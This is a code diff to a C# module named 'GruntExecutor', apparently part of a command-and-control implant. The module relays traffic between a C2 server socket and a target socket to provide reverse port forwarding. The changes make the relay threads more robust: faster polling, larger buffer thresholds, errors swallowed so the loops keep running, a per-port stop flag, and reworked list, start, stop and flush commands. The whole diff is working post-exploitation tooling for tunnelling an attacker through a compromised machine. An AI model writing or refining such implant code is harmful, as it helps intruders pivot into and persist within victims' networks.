@@ -92,9 +92,9 @@ namespace GruntExecutor
                         {
                             if (id == 0)
                             {
-                                if (bytesFromC2.Count == 10)
+                                if (bytesFromC2.Count == 10000)
                                 {
-                                    System.Threading.Thread.Sleep(5000);
+                                    System.Threading.Thread.Sleep(250);
                                 }
                                 else
                                 {
@@ -121,9 +121,9 @@ namespace GruntExecutor
                             }
                             if (id == 1)
                             {
-                                if (bytesFromTarget.Count == 10)
+                                if (bytesFromTarget.Count == 10000)
                                 {
-                                    System.Threading.Thread.Sleep(1000);
+                                    System.Threading.Thread.Sleep(250);
                                 }
                                 else
                                 {
@@ -137,7 +137,7 @@ namespace GruntExecutor
                         }
                         catch (Exception e)
                         {
-                            break;
+                            System.Threading.Thread.Sleep(250);
                         }
                     }
                     try
@@ -167,7 +167,7 @@ namespace GruntExecutor
                                 }
                                 else
                                 {
-                                    System.Threading.Thread.Sleep(1000);
+                                    System.Threading.Thread.Sleep(250);
                                 }
                             }
                             if (id == 1)
@@ -181,13 +181,13 @@ namespace GruntExecutor
                                 }
                                 else
                                 {
-                                    System.Threading.Thread.Sleep(1000);
+                                    System.Threading.Thread.Sleep(250);
                                 }
                             }
                         }
                         catch (Exception e)
                         {
-                            break;
+                            System.Threading.Thread.Sleep(250);
                         }
                     }
                     try
@@ -216,7 +216,7 @@ namespace GruntExecutor
                         keep_reading_from_Target.Start();
                         System.Threading.Thread.Sleep(1000);
                         keep_writing_to_C2.Start();
-                        while ((true))
+                        while (states[bind_port] == true)
                         {
                             try
                             {
@@ -224,18 +224,42 @@ namespace GruntExecutor
                             }
                             catch (Exception ef)
                             {
-                                keep_reading_from_C2.Abort();
-                                keep_reading_from_C2 = null;
-                                keep_writing_to_Target.Abort();
-                                keep_writing_to_Target = null;
-                                keep_reading_from_Target.Abort();
-                                keep_reading_from_Target = null;
-                                keep_writing_to_C2.Abort();
-                                keep_writing_to_C2 = null;
-                                sock_target.Shutdown(SocketShutdown.Both);
-                                sock_target.Close();
-                                sock_c2.Shutdown(SocketShutdown.Both);
-                                sock_c2.Close();
+                                try
+                                {
+                                    keep_reading_from_C2.Abort();
+                                    keep_reading_from_C2 = null;
+                                }
+                                catch { }
+                                try
+                                {
+                                    keep_writing_to_Target.Abort();
+                                    keep_writing_to_Target = null;
+                                }
+                                catch { }
+                                try
+                                {
+                                    keep_reading_from_Target.Abort();
+                                    keep_reading_from_Target = null;
+                                }
+                                catch { }
+                                try
+                                {
+                                    keep_writing_to_C2.Abort();
+                                    keep_writing_to_C2 = null;
+                                }
+                                catch { }
+                                try
+                                {
+                                    sock_target.Shutdown(SocketShutdown.Both);
+                                    sock_target.Close();
+                                }
+                                catch { }
+                                try
+                                {
+                                    sock_c2.Shutdown(SocketShutdown.Both);
+                                    sock_c2.Close();
+                                }
+                                catch { }
                                 break;
                             }
                         }
@@ -472,9 +496,6 @@ namespace GruntExecutor
                         string random_port;
                         switch (comm)
                         {
-                            case "list":
-                                output += ShowReversePortForwwrds();
-                                break;
                             case "start":
                                 bind_port = commands[1];
                                 ip = commands[0];
@@ -486,6 +507,35 @@ namespace GruntExecutor
                             case "stop":
                                 bind_port = commands[0];
                                 output += DelPortForward(func, bind_port);
+                                break;
+                            default:
+                                output += "[+] Usage:\r\n ";
+                                output += "[+] list \r\n";
+                                output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
+
+
+
+                                output += "[+] start \r\n";
+                                output += "[+] Starts a new reverse port forward.\r\n";
+                                output += "[+] start [bind port] [forward host] [forward port]\r\n\r\n";
+
+                                output += "[+] Stop\r\n";
+                                output += "[+] Stops an existing reverse port forward.\r\n";
+                                output += "[+] stop [bind port]\r\n\r\n";
+
+                                output += "[+] flush";
+                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
+                                break;
+
+
+                        }
+                    }
+                    else
+                    {
+                        switch (Command)
+                        {
+                            case "list":
+                                output += ShowReversePortForwwrds();
                                 break;
                             case "flush":
                                 output += FlushPortForward();
@@ -526,28 +576,7 @@ namespace GruntExecutor
                                 output += "[+] flush";
                                 output += "[+] Flush all reverse port forwards on an Agent.\r\n";
                                 break;
-
-
                         }
-                    }
-                    else
-                    {
-                        output += "[+] Usage: \r\n";
-                        output += "[+] list \r\n";
-                        output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
-
-
-
-                        output += "[+] start \r\n";
-                        output += "[+] Starts a new reverse port forward. \r\n";
-                        output += "[+] start [bind port] [forward host] [forward port] \r\n\r\n";
-
-                        output += "[+] Stop \r\n";
-                        output += "[+] Stops an existing reverse port forward. \r\n";
-                        output += "[+] stop [bind port] \r\n\r\n";
-
-                        output += "[+] flush \r\n";
-                        output += "[+] Flush all reverse port forwards on an Agent. \r\n";
                     }
 
                     Console.Out.Flush();
